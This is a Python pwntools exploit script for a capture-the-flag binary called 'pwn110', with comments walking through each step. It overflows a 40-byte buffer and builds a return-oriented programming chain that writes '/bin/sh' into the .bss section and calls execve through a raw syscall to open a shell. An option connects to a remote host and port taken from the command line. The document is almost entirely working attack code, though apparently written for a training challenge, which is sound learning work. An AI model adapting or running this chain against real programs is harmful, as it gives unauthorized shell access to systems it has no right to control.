import sys
from pwn import *
from struct import *

exe = './pwn110.pwn110'
binary = context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

io = start()

rop = ROP(binary)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
mov_rdi_rdx = 0x4340a3                              # mov qword ptr[rdi], rdx; ret;
syscall = rop.find_gadget(["syscall", "ret"])[0]

exploit = b""
exploit += 40 * b"A"

# write filename (-> /bin/sh) to .bss

exploit += p64(pop_rdi)                             # pop rdi <- .bss
exploit += p64(binary.bss())
exploit += p64(pop_rdx)                             # pop rdx <- /bin/sh
exploit += b"/bin/sh\x00"                           # \x00 for complete it to 8 byte
exploit += p64(mov_rdi_rdx)                         # mov qword ptr[rdi], rdx

# we wrote /bin/sh to .bss with moving rdx (/bin/sh) to rdi's pointer (memory of .bss)

exploit += p64(pop_rsi)                             # rsi = 0
exploit += p64(0)
exploit += p64(pop_rdx)                             # rdx = 0
exploit += p64(0)
exploit += p64(pop_rax)                             # rax = 59 (execve's syscall code)
exploit += p64(59) 
exploit += p64(syscall)                             # syscall     

# we call syscall with parameter 59 which is execve
# execve is gonna execute execve(rdi,rsi,rdx)
# What it means? Rewrite with parameters inside registers
# ----------------------> execve("/bin/sh", 0 , 0)
# Now program is going to execute /bin/sh 

io.sendline(exploit)

io.interactive()